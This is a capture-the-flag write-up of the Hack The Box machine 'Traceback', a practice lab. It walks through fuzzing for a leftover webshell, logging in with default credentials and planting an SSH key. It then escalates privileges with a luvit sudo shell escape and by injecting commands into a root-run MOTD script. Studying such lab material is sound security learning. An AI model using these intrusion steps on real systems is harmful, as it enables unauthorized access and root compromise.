---
title: Hackthebox Traceback Writeup
date: 2020-03-18 20:00:00 +/-TTTT
categories: [Hackthebox, Machine]
tags: [Hackthebox, Linux, lua, GTFObins, update-mote.d]
image: [/assets/img/post/hackthebox/traceback/main.png]
---

# Information:~$

| Title         | Details       |
| -------- |:--------:|
| Name         |Traceback |
| IP     | 10.10.10.181    |
| Difficulty| Easy   |
| Points | 20 |
| OS | Linux|
| Creator |[Xh4H](https://www.hackthebox.eu/home/users/profile/21439)|


# Brief:~$


Traceback is easy rated linux box. Intial foothold can be gained using already available webshells on `PORT 80` For Priv Esec sysadmin has by exploiting `lua` Programming language and for root we can edit the `update-mote.d` to gain info when logging thorugh SSH

# Reconnaisance:~$

## Nmap Scan:~$

```bash
nmap -sC -sV -oN nmap/initial 10.10.10.181
```

```bash
# Nmap 7.80 scan initiated Sun Mar 15 20:18:30 2020 as: nmap -sC -sV -oN nmap/initial 10.10.10.181
Nmap scan report for 10.10.10.181
Host is up (0.46s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp   open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
3000/tcp filtered ppp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 15 20:20:03 2020 -- 1 IP address (1 host up) scanned in 93.34 seconds
```
We get 2 Ports Open Lets visit `PORT 80`

On visiting the Page we get 

![Traceback](/assets/img/post/hackthebox/traceback/1.png){: w="700" h="400" }

On analyzing the Source code I found

```html
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
```

Seems to be some kind of Osint related.

On quick google search I founded creator github repo with webshells [Here](https://github.com/Xh4H/Web-Shells)

Let's copy these names and see if there is any webshell from these in website

```bash
[vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ cat shell.list 
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
```
I am going to use FFUF

```bash
[vibhu@parrot]─[~/HTB/boxes/ROOTED/Traceback]$ ffuf -c -w shell.list -u http://10.10.10.181/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.181/FUZZ
 :: Wordlist         : FUZZ: shell.list
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

smevk.php               [Status: 200, Size: 1261, Words: 318, Lines: 59]
:: Progress: [16/16] :: Job [1/1] :: 5 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

We got a match let's visit 10.10.10.181/smevk.php 

![Traceback](/assets/img/post/hackthebox/traceback/2.png){: w="700" h="400" }

On trying admin:admin I got access 

![Traceback](/assets/img/post/hackthebox/traceback/3.png){: w="700" h="400" }

# Initial Foothold:~$

Current user is `webadmin` and We can upload file in it home dir

So Let's upload our ssh keys and get a ssh connection

Firstly let's create ssh keys using `ssh-keygen`

```bash
[vibhu@parrot]─[~/.ssh]$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vibhu/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/vibhu/.ssh/id_rsa
Your public key has been saved in /home/vibhu/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:g2q/D1QAaxEjXK5yCmZmPXDJHcWuup0teaLrTFHuCVE vibhu@parrot
The key's randomart image is:
+---[RSA 3072]----+
| ...*E+.         |
|  oo++.o         |
| . =+o. .        |
|  +o+  +         |
|o=o= .+ S        |
|*+  =+.  .       |
|.  .+oo          |
|  oo.=oo         |
|  .*+o*+.        |
+----[SHA256]-----+
[vibhu@parrot]─[~/.ssh]$ 
```
now move id_rsa.pub to authorized_keys and upload it in webshell

```bash
[vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jul  7 10:17:41 2020 from 10.10.14.166
webadmin@traceback:~$ whoami && id
webadmin
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
webadmin@traceback:~$
```

We get a note in `home/webadmin`

```bash
webadmin@traceback:~$ ls
note.txt
webadmin@traceback:~$ cat note.txt 
- sysadmin -
I have left a tool to practice Lua.
I am sure you know where to find it.
Contact me if you have any question.
webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
webadmin@traceback:~$
```

# Privilege Escalation:~$

## webadmin -> sysadmin

Looks like sysadmin has left something related to lua language for us in his home directory

After some enumertaion I saw we can use [GTFObins](https://gtfobins.github.io/) to do priv esec

So final command would be

> sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'

```bash
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
$ id
id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
$ whoami
whoami
sysadmin
```

and we got user

```bash
$ cd
cd
$ ls
ls
luvit  pspy64  sysadmin_ssh.pub  user.txt
$ cat user.txt
cat user.txt
6bb2*********************302fec
```

## sysadmin -> root

While Logging In Via `SSH` I Found Some `Comments`, It’s Called Message Of The Day In Linux. It’s Located In `00-header` File Under `/etc/update-motd.d/` Directory.

```bash
sysadmin@traceback:/etc/update-motd.d$ ls -lah
total 32K
drwxr-xr-x  2 root sysadmin 4.0K Aug 27  2019 .
drwxr-xr-x 80 root root     4.0K Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Jul  7 10:23 00-header
-rwxrwxr-x  1 root sysadmin  982 Jul  7 10:23 10-help-text
-rwxrwxr-x  1 root sysadmin 4.2K Jul  7 10:23 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Jul  7 10:23 80-esm
-rwxrwxr-x  1 root sysadmin  299 Jul  7 10:23 91-release-upgrade
```

00-header contain the meesage that is displayed on login via ssh

```bash
sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
sysadmin@traceback:/etc/update-motd.d$ 
```

Let's see if we can read root flag through this

> echo "cat /root/root.txt" >> 00-header
> echo "id && whoami" >> 00-header

```bash
sysadmin@traceback:/etc/update-motd.d$ cat 00-header 
#!/bin/sh
#
#    00-header - create the header of the MOTD
#    Copyright (C) 2009-2010 Canonical Ltd.
#
#    Authors: Dustin Kirkland <kirkland@canonical.com>
#
#    This program is free software; you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation; either version 2 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License along
#    with this program; if not, write to the Free Software Foundation, Inc.,
#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

[ -r /etc/lsb-release ] && . /etc/lsb-release


echo "\nWelcome to Xh4H land \n"
cat /root/root.txt
id && whoami
sysadmin@traceback:/etc/update-motd.d$ 
```

And on login again via SSH i got the root flag

```bash
[vibhu@parrot]─[~/.ssh]$ ssh -i id_rsa webadmin@10.10.10.181
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land 

9fdc59db[Redacted]58d49e5a
uid=0(root) gid=0(root) groups=0(root)
root

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jul  7 10:34:22 2020 from 10.10.14.166
webadmin@traceback:~$ 
```

# Resources:~$

| Topic | Link|
|-------|-----|
|GTFObins Lua| [Here](https://gtfobins.github.io/gtfobins/lua/)|
|Update-mode.d| [Here](https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server)|


With this, we come to the end of the story of how I owned Traceback 😃

Thank you for reading !!!

*I would love to hear about any suggestions or queries.*


